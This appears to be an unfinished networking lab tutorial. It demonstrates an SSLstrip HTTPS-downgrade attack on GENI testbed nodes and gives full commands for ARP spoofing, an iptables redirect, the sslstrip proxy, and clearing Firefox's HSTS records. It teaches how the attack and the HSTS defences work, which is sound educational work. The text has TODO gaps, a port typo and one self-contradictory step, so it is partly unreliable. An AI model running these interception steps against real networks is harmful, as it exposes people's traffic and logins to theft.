To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

* Skip to [Results]()
* Skip to [Run my experiment](#run-my-experiment)

## Background
 
SSLstrip is an attack on HTTPS that allows an attacker to intercept the plaintext contents of an exchange that would normally be confidential. It involves two steps:

1. The attacker mounts a man-in-the-middle attack so that traffic from the target device will be sent through the attacker.
2. When the target visits a website, the attacker acts a proxy, serving an HTTP (non-encrypted) version of the site to the target. Meanwhile, the attacker relays all of the target's actions on the site to the real destination over HTTPS.

The target can see that the connection is insecure, but does not know whether the
connection should be secure. The website that the target visits believes the connection to be secure (since it sees an HTTPS connection to the proxy operated by the attacker).

## Run my experiment

First, reserve your resources. You will need one publicly routable IP - if you are having trouble getting resources, you may use [this monitoring page](https://genimon.uky.edu/status) to find sites with publicly routable IPs available.

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: https://raw.githubusercontent.com/esilver0/CATT/master/sslstrip_request_rspec.xml

This should load a topology onto your canvas, with a client, a router, and an attacker. The RSpec also includes commands to install necessary software on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources.

Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready). Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).

### Open a browser on the client

To see what our "client" node sees when it browses the Internet, we'll need to be able to open a web browser on our client node. We will set up a VNC connection so that we can run graphical applications on the client.

On the client node, run

```
vncserver :0  
```

and enter a password (twice) when prompted. (Nothing will appear as you type the password.) **Choose "n"** when asked to enter a view-only password. After a few seconds and a few lines of output, you should be returned to your terminal prompt:

```
ffund01@client:~$ vncserver :0

You will require a password to access your desktops.

Password:  
Verify:  
Would you like to enter a view-only password (y/n)? n  
xauth:  file /users/ffund01/.Xauthority does not exist

New 'X' desktop is client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0

Creating default startup script /users/ffund01/.vnc/xstartup  
Starting applications specified in /users/ffund01/.vnc/xstartup  
Log file is /users/ffund01/.vnc/client.sslstrip.ch-geni-net.instageni.maxgigapop.net:0.log  
```

Next, we will install a ["connector"](http://novnc.com/info.html) that will let us access this graphical interface from a web browser. On the "client" node, run

```
git clone git://github.com/kanaka/noVNC  
```

and then

<pre>
cd noVNC/
screen ./utils/launch.sh --vnc <b>client.sslstrip.ch-geni-net.instageni.maxgigapop.net</b>:5900
</pre>

where in place of the bold part above, you use the hostname shown for the "client" node in the GENI Portal.

After some more lines of output, you should see a URL, e.g.:

```
Navigate to this URL:

    http://client.sslstrip.ch-geni-net.instageni.maxgigapop.net:6080/vnc.html?host=client.sslstrip.ch-geni-net.instageni.maxgigapop.net&port=6080
``` 

If you press Ctrl‑C, rerun the command. To detach or reattach, see [Notes](#notes).

Open this URL in a browser. (A recent version of Google Chrome is recommended.) Enter a password when prompted. Then, at the terminal, run

```
firefox  
```

and a browser window should come up.

This browser is running on the "client" node, _not_ on your own laptop. Leave this open - we will use it throughout our experiment.

> _**Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack._



### Redirect traffic for remote site through router

In this experiment, we will attack an exchange between this client and several websites.

By default, if you visit https://witestlab.poly.edu in the Firefox browser that's running in NoVNC, traffic between the client and the website will go through the control interface on the client (that is used to log in to the client over SSH), not through the experiment interface. To demonstrate the SSLstrip attack, we'll want this traffic to go over the experiment network.

Open another SSH session to the client, and in it, run

```
sudo route add -host $(dig +short witestlab.poly.edu) gw 192.168.0.1
sudo route add -host $(dig +short nyu.edu) gw 192.168.0.1
sudo route add -host $(dig +short youtube.com) gw 192.168.0.1
```

to have traffic for the websites routed through the router on the experiment interface, 192.168.0.1. (When you run this command, the `$(dig +short witestlab.poly.edu)` variable will be filled in automatically with the actual IP address of the website - the `dig` command is used to resolve the hostname to its IP address.)

Then run 

```
route -n
```

and verify that these host-specific entries appears in the routing table. For example:

<pre>
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
128.238.66.220  192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
216.165.47.10   192.168.0.1     255.255.255.255 UGH   0      0        0 eth1
</pre>

For return traffic from nyu.edu to the client to reach the router, we'll also need to set up NAT on the router. Open an SSH session to the router node, and run

<pre>
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
</pre>

Here,

* The first rule tracks connections involving the 192.168.0.0/24 network, and makes sure that packets initiating a new connection are forwarded from the LAN to the WAN.
* The second rule allows forwarding of packets that are part of an established connection.
* The third and fourth rules actually do the network address translation. They will rewrite the source IP address in the Layer 3 header of packets forwarded out on the WAN interface. Also, when packets are received from the WAN, it identifies the connection that they belong to, rewrites the destination IP address in the Layer 3 headers, and forwards them on the LAN.


(For more details on how NAT works, see [this experiment](https://witestlab.poly.edu/blog/basic-home-gateway-services-dhcp-dns-nat/#nat).)

Also make sure that the router is forwarding traffic, by running

```
sudo sysctl -w net.ipv4.ip_forward=1
```

on the router node.

To make sure this all works as expected, on the router node run

```
sudo tcpdump -i eth1
```

and in the Firefox instance running in NoVNC, visit

http://witestlab.poly.edu

Make sure that the page loads, and make sure you can see exchange in your `tcpdump` window - this is how you know that traffic for this host is going through the router via the experiment network, and not through the control interface on the client. Once you have verified this, you can stop the `tcpdump` on the router.

You should also verify that the page is loaded over HTTPS - the browser will show a green padlock icon in the address bar to indicate that the connection is secure:

![](/blog/content/images/2018/03/sslstrip-no-attack.png)

Even though we didn't specify HTTPS in the address bar, the web server at witestlab.poly.edu is configured to use HTTPS for all connections, so the page will be loaded over HTTPS. 

### Execute the man-in-the-middle attack

We're now ready to carry out the attack. Open an SSH session to the attacker node.

Set up the attacker to forward traffic:

```
sudo sysctl -w net.ipv4.ip_forward=1
```

and to perform NAT:

```
sudo iptables -A FORWARD -o eth0 -i eth1 -s 192.168.0.0/24 -m conntrack --ctstate NEW -j ACCEPT  
sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  
sudo iptables -t nat -F POSTROUTING  
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
```

Now, we're going to use ARP spoofing to get the client to send traffic through the attacker, instead of directly to the router. On the client node, check the client's ARP table with

```
arp -n -a -i eth1
```

You should see that the client has an entry for the router's IP address (192.168.0.1), with the router's MAC address. (Use `ifconfig eth1` on the router to verify its MAC address.) For example:

```
? (192.168.0.1) at 02:fb:83:fe:12:7e [ether] on eth1
```

Next, on the attacker, run

```
screen sudo arpspoof -i eth1 -t 192.168.0.2 192.168.0.1
```

to start the ARP spoofing. Re-run

```
arp -n -a -i eth1
```

on the client, and you should now see an entry for the router's IP address (192.168.0.1) but with the attacker's MAC address. For example:

```
? (192.168.0.99) at 02:ec:23:e9:fe:46 [ether] on eth1
? (192.168.0.1) at 02:ec:23:e9:fe:46 [ether] on eth1
```

Verify that the man-in-the-middle attack works. On the attacker node, run

```
sudo tcpdump -i eth1 tcp
```

and on the router node, also run

```
sudo tcpdump -i eth1 tcp
```

Finally, in the Firefox running in NoVNC, reload the web page at 

http://witestlab.poly.edu

Verify that the page loads (it should still be over HTTPS). You should see traffic in the `tcpdump` that runs on the attacker, but not on the `tcpdump` that runs on the router. Once you've verified this, you can stop both `tcpdump` instances.

### Execute the HTTPS stripping attack

Finally, we're ready to execute the HTTPS stripping part of the attack.

On the attacker node, run the following command:

```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

This will redirect traffic to port 80 (the default web port for HTTP traffic) to port 1000, which is where the proxy will listen.

Then, on the attacker, run

```
screen sslstrip -l 10000
```

to start the SSL stripping proxy.

**Visting a site for the first time**

In the Firefox window where NoVNC is running, visit

http://nyu.edu

for the first time. Verify that that the connection is over HTTP. If you go to nyu.edu in another tab on your computer you will see that the website supports HTTPS.

**Visting a site that you have already established a secure connection with**

On an SSH session on the attacker, run

```
killall sslstrip
```

to stop the SSL stripping proxy.

In the Firefox window where NoVNC is running, visit

http://nyu.edu.

Check that this time the connection is over HTTPS demonstrating that the SSLstrip attack works.

Then, on the attacker node, run

```
screen sslstrip -l 10000
```

to restart the SSL stripping proxy.

In the Firefox window where NoVNC is running, visit

http://nyu.edu

once more.

Verify that this time there is an HTTPS connection even though SSLstrip is enabled. This is becuase of the [HSTS protocal](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) which helps mitigate SSLstrip by instructing the browser to not downgrade to HTTP once a secure connection has been established. 


*Optional: Once a site that supports HSTS has been visited with a secure connection, you can delete the history enabling SSLstrip to take effect. See [Circumventing HSTS](#circumventing-hsts)*

**Visting a site that does not support HSTS**

Not all websites support HSTS. It is an opt-in protocol.

On an SSH session on the attacker, run
```
killall sslstrip
```
to stop the SSL stripping proxy.

In the Firefox window where NoVNC is running, visit

**TODO**

for the first time. Verify the website supports HTTPS.

Then, on the attacker node run
```
screen sslstrip -l 10000
```
to restart the SSL stripping proxy.

In the Firefox window where NoVNC is running, visit

**TODO**

for the second time.

Verify that the connection is via HTTP even thought a connection via HTTPS was already established.


**Visting a site on the HSTS preload list**

There is an [HSTS preload list](https://hg.mozilla.org/releases/mozilla-release/file/tip/security/manager/ssl/nsSTSPreloadList.inc) that comes with the browser. Firefox will not accept an HTTP (insecure) request from any website on this list even if you are visiting the site for the first time. 

In the Firefox window where NoVNC is running, visit

http://youtube.com

for the first time. 

Verify that there is an HTTPS connection and that youtube.com is on the [list](https://hg.mozilla.org/releases/mozilla-release/raw-file/tip/security/manager/ssl/nsSTSPreloadList.inc).






### Expand the experiment
To attempt this with other websites on the client, run

<pre>
sudo route add -host $(dig +short <b>website</b>) gw 192.168.0.1
</pre>
replacing the part in bold with the website. Then visit the site in the browser on the client.






## Notes

### Detaching and attaching to screen

Press Ctrl‑A then Ctrl‑D to detach from a screen without terminating the process.
To reattach to a screen after detaching, run.
```
screen -r
```

If the SSH connection is lost, run

```
screen -Dr
```

### Circumventing HSTS

**WARNING:** Make sure this is in the Firefox window where NoVNC is running and not the address bar for your browser. If you are not certain, do not attempt to circumvent HSTS.

In the firefox session enter

```
about:support
```

in the address bar.

Copy the file location to the right of "Profile Directory" and "Open Directory". Then close all the tabs in the Firefox window where NoVNC is running. Instead you could in another "client" session, run `killall firefox`

Run 

<pre>
nano <b>/users/ers595/.mozilla/firefox/70y24mrv.default</b>/SiteSecurityServiceState.txt
</pre>
Replace the part in bold with the file location.

*See WARNING above before proceeding* \
Clear any line containing the websites you want to remove.


Save the changes, then run

```
firefox
```

in the browser.

As far as HSTS is concerned, it is as if an HTTPS connection with the websites were never established in the first place. HSTS was not disabled, just the history of established connections for the individual sites were removed.

### Exercise
